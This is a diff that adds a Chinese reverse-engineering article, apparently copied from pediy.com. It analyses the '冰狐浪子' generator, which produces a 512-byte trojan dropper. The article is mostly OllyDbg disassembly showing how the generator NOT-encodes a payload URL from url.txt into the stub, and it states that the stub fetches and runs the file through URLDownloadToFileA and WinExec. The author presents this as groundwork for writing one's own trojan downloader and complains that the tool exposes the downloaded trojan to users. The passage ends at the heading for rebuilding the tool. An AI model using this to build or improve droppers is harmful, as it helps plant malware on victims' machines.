@@ -1,0 +1,276 @@
+
+# (高手勿入)简单分析"冰狐浪子下载运行 512 生成器
+
+> 原文：[`www.pediy.com/kssd/pediy07/pediy7-292.htm`](https://www.pediy.com/kssd/pediy07/pediy7-292.htm)
+
+简单分析"冰狐浪子下载运行 512 生成器
+
+——兼谈编写属于自己的 `downloader`
+
+我现在的理想是教书育人，不要觉得奇怪，估计你也感到现在太多的垃圾老师了。所以我想做的是取代他们。这就是我尽己所能写点好文章的原因。
+
+感谢冰狐浪子提供如此优秀的作品
+
+本文的测试平台为 `winxp sp1`，没有在其它的系统上测试，可能由于 `align:512` 选项不能在 98 下运行。这次逆向工程的对象是："冰狐浪子下载运行 512 生成器", 在众多的 `downloader` 中，个人觉得这个工具是最理想的(仅仅从下载和执行功能上来看),生成的"冰狐 downRun512.exe"仅有 512 字节(大概是最小的啦)。后门嘛，当然越小越好拉。
+
+## 1."冰狐浪子下载运行 512 生成器"的使用方法：
+
+把 `Url.txt` 文件中的网址改为你要下载并运行的程序的下载地址
+
+\[注意:网址长度不能大于 53 个字符,并且 `Url.txt` 中不要有网址以外的其他多余的字符如回车\]
+
+然后运行<<冰狐浪子下载运行 512 生成器.exe>>
+
+你将在同目录下得到一个大小仅仅为 512 字节的<<冰狐 downRun512.exe>>
+
+`冰狐 downRun512.exe` 可以下载并且执行 `URL` 中对应的程序。
+
+## 2."冰狐浪子下载运行 512 生成器"的缺陷(纯粹个人看法)
+
+注意：作者提到长度不大于 53 个个字符，并且 `Url.txt` 中不要有网址以外的其他多余的字符如回车。
+
+等会儿我会从汇编代码级分析为什么要有这样的限制。以及如何在我们自己写的 `downloader` 中突破这样的限制。另外该软件的缺陷是：只能下载到当前目录，这不是把我们辛辛苦苦从网上下载的木马暴露在使用者的面前吗？在我们自己写的 `downloader` 中一定要避免这个问题，
+
+也就是允许用户指定下载的文件的存放路径。
+
+## 3.本文使用的工具：
+
+`ollydbg1.0` 中文修改版，`Microsoft Visual C++ 6.0`，`Hex Workshop 4.2`。
+
+为什么不用 `IDA`，因为 `IDA` 太慢了，以前试用过 2 次，实在慢得无法忍受。再说了，一般情况下 `ollydbg` 就够用，而且速度飞快。`Hex Workshop` 用于比较文件，和查找字符串的偏移量，以及测试我们的分析是否正确。
+
+## 4.反汇编代码分析:
+
+如果你有一点点汇编和 `c` 语言基础，知道几个 `API`，那么下面的分析应该是种享受，因为冰狐浪子下载运行 512 生成器好象是用汇编语言编写的，结构清晰，反汇编的代码可读性级佳，很值得学习。特别适合于学习 `win32` 汇编。
+
+下面的分析使用的是作者发布的程序中自带的 `URL.txt`,
+
+文件存放的 `URL` 是："http://www.godog.y365.com/cs/icyfox.jpg"。好了,开始享受代码吧：
+
+下面第一段代码是程序入口，解密从 `401000` 开始的 `0x200`（512）个字节，也就是生成的“冰狐 downRun512”的大部分二进制代码，为什么是大部分，而不是全部呢？因为还有 `URL` 是可变的，需要通过 `URL.txt` 来读取,还有生成的文件名“冰狐 downRun512”也是要读取的。
+
+解密 512 个字节，刚好是生成的"冰狐 downRun512.exe"的大小，不是巧合哦
+
+```
+0040121F 冰>/$  B9 00020000 mov ecx,200                      ;  0x200 即十进制的 512
+
+00401224  .|.  8D35 001040>lea esi,dword ptr ds:[401000]
+
+0040122A  .|.  8D3D 001040>lea edi,dword ptr ds:[401000]
+
+00401230  .|>  AC         /lods byte ptr ds:[esi]
+
+00401231  .|.  F6D0       |not al        ;解密方法：取反
+
+00401233  .|.  AA         |stos byte ptr es:[edi]    ;再保存回去
+
+00401234  .|.  E2 FA      \\loopd short 冰狐浪子.00401230  ;循环解密
+```
+
+检测当前目录下是否存在"`url.txt"`
+
+```
+00401236  .|.  6A 00      push 0                       ; /hTemplateFile = NULL
+
+00401238  .|.  68 80000000 push 80                     ; |Attributes = NORMAL
+
+0040123D  .|.  6A 03      push 3                       ; |Mode = OPEN_EXISTING
+
+0040123F  .|.  6A 00      push 0                       ; |pSecurity = NULL
+
+00401241  .|.  6A 01      push 1                       ; |ShareMode = FILE_SHARE_READ
+
+00401243  .|.  68 00000080 push 80000000                ; |Access = GENERIC_READ
+
+00401248 |.  68 04124000  PUSH bh.00401204             ; |FileName = "url.txt"，通过读取 00401204 处的字符串作为要读取的文件名
+
+0040124D  .|.  E8 82000000 call <jmp.&kernel32.CreateFileA>   ; \\CreateFileA
+
+00401252  .|.  83F8 FF   cmp eax,-1                     ;  检测当前目录下是否有 url.txt
+
+00401255  .|.  74 6F     je short 冰狐浪子.004012C6       ;  没有，则程序退出
+```
+
+读取"`url.txt`"中的 `0x35` 即 53 个字节,还记得前面提到的 53 个字节的限制吗？就体现在这里了。
+
+```
+00401257  .|.  8BD8       mov ebx,eax
+
+00401259  .|.  6A 00      push 0                       ; /pOverlapped = NULL
+
+0040125B  .|.  68 00124000 push 冰狐浪子.00401200             ; |pBytesRead = 冰狐浪子.00401200
+
+00401260  .|.  6A 35      push 35                     ; |BytesToRead = 35 (也就是十进制的 53)
+
+00401262  .|.  68 06104000 push 冰狐浪子.00401006             ; |Buffer = 冰狐浪子.00401006
+
+00401267  .|.  53        push ebx                    ; |hFile
+
+00401268  .|.  E8 73000000 call <jmp.&kernel32.ReadFile>      ; \\ReadFile
+
+0040126D  .|.  53        push ebx                    ; /hObject
+
+0040126E  .|.  E8 5B000000 call <jmp.&kernel32.CloseHandle>   ; \\CloseHandle
+```
+
+这 4 句把从"`url.txt`"中的 `0x35` 即 53 个字节 `URL` 进行取反加密，加密长度为把 `URL` 的长度
+
+```
+00401273  .|.  8B0D 001240>mov ecx,dword ptr ds:[401200]      ;  把 URL 的长度放到 ecx
+
+00401279  .|.  8D35 061040>lea esi,dword ptr ds:[401006]  ;注意这个地址 401006，到最后生成的"冰狐 downRun512.exe"
+
+其文件偏移量是 6，后面写自己的 downloader 时需要定位到相应的地方
+
+0040127F  .|.  8D3D 061040>lea edi,dword ptr ds:[401006]
+
+00401285  .|>  AC        /lods byte ptr ds:[esi]            ;
+
+00401286  .|.  F6D0       |not al
+
+00401288  .|.  AA        |stos byte ptr es:[edi]
+
+00401289  .|.  E2 FA      \\loopd short 冰狐浪子.00401285
+```
+
+调用 `CreateFileA` 创建 "冰狐 downRun512.exe"
+
+```
+0040128B  .|.  6A 00      push 0                       ; /hTemplateFile = NULL
+
+0040128D  .|.  68 80000080 push 80000080               ; |Attributes = NORMAL|WRITE_THROUGH
+
+00401292  .|.  6A 02      push 2                       ; |Mode = CREATE_ALWAYS
+
+00401294  .|.  6A 00      push 0                       ; |pSecurity = NULL
+
+00401296  .|.  6A 00      push 0                       ; |ShareMode = 0
+
+00401298  .|.  68 00000040 push 40000000                ; |Access = GENERIC_WRITE
+
+0040129D  .|.  68 0C124000 push 冰狐浪子.0040120C             ; |FileName = "冰狐 downRun512.exe"
+
+004012A2  .|.  E8 2D000000 call <jmp.&kernel32.CreateFileA>   ; \\CreateFileA
+```
+
+写入 `0x200` 即 512 字节
+
+```
+004012A7  .|.  8BD8       mov ebx,eax                  ;
+
+004012A9  .|.  6A 00      push 0                       ; /pOverlapped = NULL
+
+004012AB  .|.  68 00124000 push 冰狐浪子.00401200             ; |pBytesWritten = 冰狐浪子.00401200
+
+004012B0  .|.  68 00020000 push 200                     ; |nBytesToWrite = 200 (512.)
+
+004012B5  .|.  68 00104000 push 冰狐浪子.00401000             ; |Buffer = 冰狐浪子.00401000 和 00401200 的距离是 0x200 即 512 个字节
+
+004012BA  .|.  53        push ebx                    ; |hFile
+
+004012BB  .|.  E8 26000000 call <jmp.&kernel32.WriteFile>     ; \\WriteFile
+```
+
+//任务完成了，程序退出
+
+```
+004012C0  .|.  53        push ebx                    ; /hObject
+
+004012C1  .|.  E8 08000000 call <jmp.&kernel32.CloseHandle>   ; \\CloseHandle
+
+004012C6  .|>  6A 00      push 0                       ; /ExitCode = 0
+
+004012C8  .\\.  E8 0D000000 call <jmp.&kernel32.ExitProcess>   ; \\ExitProcess
+```
+
+//这里是程序中定义的数据
+
+```
+00401204  .  75 72 6C 2E 7>ASCII "url.txt",0  //就是从这里读去的 URL
+
+0040120C     B1          DB B1  ;     "冰狐"的编码，结合下面的"downRun512.exe"，组成"冰狐 downRun512.exe"
+
+0040120D     F9          DB F9
+
+0040120E     BA          DB BA
+
+0040120F     FC          DB FC
+
+00401210  .  64 6F 77 6E 5>ASCII "downRun512.exe",0
+```
+
+用 `ollydbg` 动态调试以验证我们的分析(只列出一部分，完整调试请自行动手)：
+
+当执行到 `0040126D` 时，到数据窗口可以看到，从 `URL.txt` 中读取的网址：
+
+```
+00401006  68 74 74 70 3A 2F 2F 77  http://w
+
+0040100E  77 77 2E 67 6F 64 6F 67  ww.godog
+
+00401016  2E 79 33 36 35 2E 63 6F  .y365.co
+
+0040101E  6D 2F 63 73 2F 69 63 79  m/cs/icy
+
+00401026  66 6F 78 2E 6A 70 67     fox.jpg
+```
+
+当执行到 `0040128B` 时,从 `URL.txt` 中读取的网址被加密成了如下数据：
+
+```
+00401006  97 8B 8B 8F C5 D0 D0 88  棆嫃判袌
+
+0040100E  88 88 D1 98 90 9B 90 98  垐褬悰悩
+
+00401016  D1 86 CC C9 CA D1 9C 90  褑躺恃湊
+
+0040101E  92 D0 9C 8C D0 96 9C 86  捫湆袞渾
+
+00401026  99 90 87 D1 95 8F 98     檺囇晱?
+```
+
+当执行完 `004012A2 call <jmp.&kernel32.CreateFileA>`后
+
+冰狐浪子下载运行 512 生成器所在的目录下面生成了文件 "冰狐 downRun512.exe"
+
+当执行完 `004012BB call <jmp.&kernel32.WriteFile>`后,程序已经将"冰狐浪子下载运行 512 生成器.exe"
+
+的 `00401000` 和 `00401200` 的距离的 `0x200` 即 512 个字节写入了"冰狐 downRun512.exe"
+
+ok，我们来清理一下思路，整个程序的流程是这样的：
+
+```
+开始—>解密 512 个字节
+
+          /不存在—>程序退出(结束)
+
+—>检测当前目录下是否存在"url.txt"—>(2 个分支)
+
+          \\存在—>读取"url.txt"中的 53 个字节—>
+
+对 53 个字节 URL 进行取反加密—>创建 "冰狐 downRun512.exe"—>写入 512 字节(包括加密的 URL)
+
+—>程序退出(结束)
+```
+
+用 `vc++` 以 `binary` 方式打开"冰狐 downRun512.exe"，在文件尾部可以看到以下字符串：
+
+```
+URLDownloadToFileA
+
+urlmon.dll€
+
+ExitProcess?
+
+WinExec
+
+kernel32.dll?
+```
+
+很明显，程序使用 `urlmon.dll` 中的 `URLDownloadToFileA` 来下载文件。然后用 `WinExec` 来执行下载的文件。
+
+如果读者有兴趣不妨分析一下"冰狐 downRun512.exe"。这里我就不分析了，目标不是这个，呵呵。如果不了解以上 `API`，请查阅 `MSDN`。现在可以回答："为什么 `Url.txt` 中不要有网址以外的其他多余的字符如回车"
+
+因为程序对 `URL` 的加密方式是取反，解密后的 `URL` 最后一个字节必须是 0(是 `ASC 0`，不是字符 0 啊)，如果其他多余的字符如回车，取反之后当然不能变成 0 啊，呵呵。
+
+## 5.再现"冰狐浪子下载运行 512 生成器"
